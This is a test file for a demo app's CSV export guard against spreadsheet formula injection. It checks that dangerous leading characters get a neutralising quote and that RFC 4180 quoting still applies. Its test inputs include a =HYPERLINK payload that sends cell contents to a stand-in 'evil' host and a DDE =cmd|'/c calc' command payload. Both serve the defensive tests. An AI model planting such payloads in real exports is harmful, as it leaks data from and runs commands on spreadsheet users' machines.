// apps/demo/test/csv.test.ts — CSV formula-injection guarding (see
// apps/demo/csv.ts's own doc comment for the attack this defends against:
// a customer enrols through the public form with a name like
// `=HYPERLINK(...)`, and the merchant's spreadsheet app evaluates it on
// open). Pure logic, no HTTP, no database.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { csvField, csvRow } from '../csv.ts';

test('a value beginning with "=" is neutralised with a leading single quote', () => {
  const out = csvField('=HYPERLINK("https://evil/?x="&A2&B2,"Refund pending")');
  assert.ok(out.startsWith('"\''), `expected a quoted field starting with a neutralising quote, got: ${out}`);
  assert.ok(!out.startsWith('="') && !out.startsWith('=HYPERLINK'), 'the raw formula must not survive at the start of the field');
});

test('each dangerous prefix (=, +, -, @, tab, CR) gets a neutralising leading quote', () => {
  const dangerous = ['=1+1', '+1+1', '-1+1', '@SUM(A1:A2)', '\tevil', '\revil'];
  for (const value of dangerous) {
    const out = csvField(value);
    // Strip RFC 4180 quoting (if applied) to inspect the actual first character.
    const unwrapped = out.startsWith('"') && out.endsWith('"') ? out.slice(1, -1).replace(/""/g, '"') : out;
    assert.equal(unwrapped[0], "'", `expected a leading single quote for ${JSON.stringify(value)}, got ${JSON.stringify(out)}`);
  }
});

test('the DDE variant (=cmd|...!A0) is neutralised the same way', () => {
  const out = csvField("=cmd|'/c calc'!A0");
  const unwrapped = out.startsWith('"') && out.endsWith('"') ? out.slice(1, -1).replace(/""/g, '"') : out;
  assert.equal(unwrapped[0], "'");
});

test('an ordinary value is untouched', () => {
  assert.equal(csvField('Ahmed'), 'Ahmed');
  assert.equal(csvField(''), '');
});

test('RFC 4180 quoting still applies: commas, quotes and newlines get wrapped and quotes doubled', () => {
  assert.equal(csvField('O\'Brien, Jr'), '"O\'Brien, Jr"');
  assert.equal(csvField('She said "hi"'), '"She said ""hi"""');
  assert.equal(csvField('line1\nline2'), '"line1\nline2"');
});

test('a dangerous prefix combined with a comma is both neutralised and quoted', () => {
  const out = csvField('=1+1,2');
  assert.equal(out, '"\'=1+1,2"');
});

test('csvRow joins fields with commas, each independently guarded', () => {
  assert.equal(csvRow(['a', '=b', 'c,d']), 'a,\'=b,"c,d"');
});
